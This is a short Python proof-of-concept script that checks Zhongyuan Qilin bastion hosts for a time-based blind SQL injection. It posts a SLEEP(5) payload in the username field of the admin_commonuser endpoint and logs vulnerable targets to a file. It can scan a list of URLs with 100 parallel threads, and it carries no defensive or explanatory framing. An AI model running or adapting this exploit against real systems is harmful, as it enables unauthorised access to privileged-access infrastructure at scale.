# 中远麒麟堡垒机存在SQL注入
import requests
import argparse
import sys
import time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    pass

def main():
    # 处理命令行参数
    parser = argparse.ArgumentParser(description="中远麒麟堡垒机存在SQL注入")
    parser.add_argument('-u', '--url', dest='url', type=str, help='input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')
    args = parser.parse_args()

    # 判断参数类型，并调用相应的函数处理
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/admin.php?controller=admin_commonuser'
    header = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm"
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }

    try:
        res1 = requests.get(url=target+url_payload, headers=header,verify=False)
        if res1.status_code == 200:
            res2 = requests.post(url=target+url_payload, headers=header, data=data, proxies=proxies, verify=False)
            res3 = requests.post(url=target+url_payload, headers=header, verify=False)
            time1 = res2.elapsed.total_seconds()
            time2 = res3.elapsed.total_seconds()
            
            if time1 - time2 >= 5:
                print(f'该url{target}存在延时注入')
                with open('result.txt', 'a') as f:
                    f.write(target + '\n')
            else:
                print(f'该url{target}不存在延时注入')
        else:
            print(f'该网站{target}可能存在问题，请手工测试')

    except Exception as e:
        print(f'发生异常：{str(e)}')

if __name__ == '__main__':
    main()

